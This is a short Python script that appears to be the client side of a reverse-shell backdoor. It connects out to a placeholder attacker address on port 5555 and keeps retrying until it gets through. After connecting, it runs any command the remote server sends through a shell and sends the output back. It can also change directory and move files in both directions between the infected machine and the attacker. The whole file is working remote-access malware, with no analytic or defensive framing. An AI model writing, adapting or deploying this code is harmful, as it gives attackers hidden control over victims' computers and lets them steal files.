import socket
import time
import json
import subprocess
import os


HOST = "IP"
PORT = 5555


def reliable_send(command):
    jsondata = json.dumps(command)
    client.send(jsondata.encode("utf-8"))


def reliable_recv():
    data = ''
    while True:
        try:
            data = data + client.recv(1024).decode("utf-8").rstrip()
            return json.loads(data)

        except ValueError:
            continue


def connection():
    time.sleep(20)
    while True:
        try:
            client.connect((HOST, PORT))
            shell()
            client.close()

        except:
            connection()


def shell():
    while True:
        command = reliable_recv()
        if command == "quit":
            break
            #comparing three characters with empty space

        elif command[:3] == "cd ":
             os.chdir(command[3:]) #cd Desktop => os.chdir(Desktop)

        elif command[:8] == "download":
            upload_file(command[9:])

        elif command[:6] == "upload":
            download_file(command[7:])

        else:
            # execute command
            execute = subprocess.Popen(command,shell=True,stdout=subprocess.PIPE,stdin=subprocess.PIPE,stderr=subprocess.PIPE)
            result = execute.stdout.read()+execute.stderr.read()
            result= result.decode("utf-8")
            reliable_send(result)
      
#ulpoad file to server 
def upload_file(filename):
     f =  open(filename,"rb")
     client.send(f.read())

#download file from server
def download_file(filename):
    f =  open(filename,"wb")
    client.settimeout(1)
    chunk = client.recv(1024)
    while chunk:
        f.write(chunk)
        try:
            chunk = client.recv(1024)


        except socket.timeout as e:
            break
    client.settimeout(None)
    f.close()






client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connection()